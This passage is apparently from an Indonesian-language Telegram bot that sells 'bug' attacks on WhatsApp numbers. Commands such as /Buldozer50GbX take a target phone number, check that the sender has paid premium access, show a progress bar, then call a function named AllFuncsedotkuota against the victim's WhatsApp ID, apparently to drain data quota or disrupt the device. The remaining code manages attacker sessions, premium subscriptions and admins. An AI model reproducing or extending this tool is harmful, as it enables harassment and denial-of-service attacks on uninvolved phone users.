  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await AllFuncsedotkuota(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Buldozer50GbX\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await AllFuncsedotkuota(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======plugins=======//
bot.onText(/\/Addsender(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Cek izin akses
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah user mengisi nomor bot
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah. Harap masukkan nomor bot.\nContoh:\n`/Addsender 628xxxxxx`",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi nanti."
    );
  }
});

const moment = require("moment");

bot.onText(/\/Addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /Addprem x id 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /Addprem x id 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /Addprem x id 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/Addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /Addadmin x id."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /Addadmin x id."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});

bot.onText(/\/Delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /Delprem x id"
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }

  // Cari index user dalam daftar premium
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }

  // Hapus user dari daftar
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});

bot.onText(/\/Deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Pengecekan input dari pengguna
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /Deladmin x id."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /Deladmin x id."
    );
  }

  // Cari dan hapus user dari adminUsers
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
